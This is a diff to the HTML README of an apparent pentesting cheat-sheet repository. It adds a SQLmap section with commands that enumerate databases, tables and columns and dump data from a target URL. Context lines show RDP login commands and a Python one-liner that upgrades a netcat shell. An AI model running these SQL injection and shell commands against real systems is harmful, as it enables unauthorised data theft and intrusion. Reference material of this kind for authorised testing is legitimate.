@@ -9,7 +9,7 @@
 	<li> <a href='https://github.com/Kode-n-Rolla/pentesting_time/tree/main/network_tools'> Network tools </a>
 	<li> <a href='https://github.com/Kode-n-Rolla/pentesting_time/tree/main/shells'> Web Shells </a>
 	<!-- <li> <a href=''> Scripts </a> 
-		SQLMAP-->
+		-->
   	<li> <a href='#n1'> Command examples </a>
   	<li> <a href='#n2'> Payloads </a>
   	<li> <a href='#n3'> Helpful sites </a>
@@ -35,6 +35,7 @@
 	<li> <a href='#n1.7'> Hydra </a>
 	<li> <a href='#n1.8'> Dirsearch </a>
 	<li> <a href='#n1.9'> Pump </a> shell, if target system has python3
+	<li> <a href='#n1.10'> SQLmap </a>
 <h3 id='n1.1'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Remote Desktop Protocol (RDP): </h3>
   <pre><code> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;TARGET_IP> /u:&lt;USERNAME> /p:&lt;'PASSWORD'> </code></pre>
   <p><pre><code> xfreerdp /v:&lt;TARGET_IP> /u:&lt;USERNAME> /p:&lt;PASSWORD> +clipboard </code></pre>
@@ -141,6 +142,28 @@ Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>
 <h3 id='n1.9'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Python command to pump nc shell </h3>
    PTY is a library for pseudo-terminal functionality that is part of the Standard Python Library. There is a nc shell and get pump shell:
    <pre><code> python -c 'import pty;pty.spawn("/bin/bash")' </code></pre>
+
+<h3 id='n1.10'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQLmap </h3>
+	Start SQL injection attack:
+ 	<pre><code>sqlmap -u "&lt;TARGTE_URL>" --dbs --batch</code></pre>
+  		-u - target URL
+   		<p>--dbs - get db name
+    		<p>--batch -default whenever user input is unavoidable
+     	<p> When get the db name to get tables name
+	<pre><code>sqlmap -u "&lt;TARGET_URL>" -D &lt;db_name> --tables --batch</code></pre>
+		-D - db name
+  		<p>--tables - tables enumiration
+    	<p> To get columns name in the table of interest
+     	<pre><code>sqlmap -u "&lt;TARGET_URL>" -D &lt;db_name> -T &lt;table_name> --columns --batch</code></pre>
+		-T - selected table
+  		<p>--columns - to output db columns
+    	<p> Get data from table
+     	<pre><code>sqlmap -u "&lt;TARGET_URL>" -D &lt;db_name> -T &lt;table_name> --dump --batch</code></pre>
+      		--dump - unload information from the DBMS database 
+	<p> Will execute all the above functions at once and output all information about the database, including table names, columns, etc.
+     	<pre><code>sqlmap -u "&lt;TARGET_URL>" -D &lt;db_name> --dump-all --batch</code></pre>
+      		--dump-all - unload all information from the DBMS database 
+
 
 <h3 align='right'><a href='#start'> <-- Back </a></h3>
    
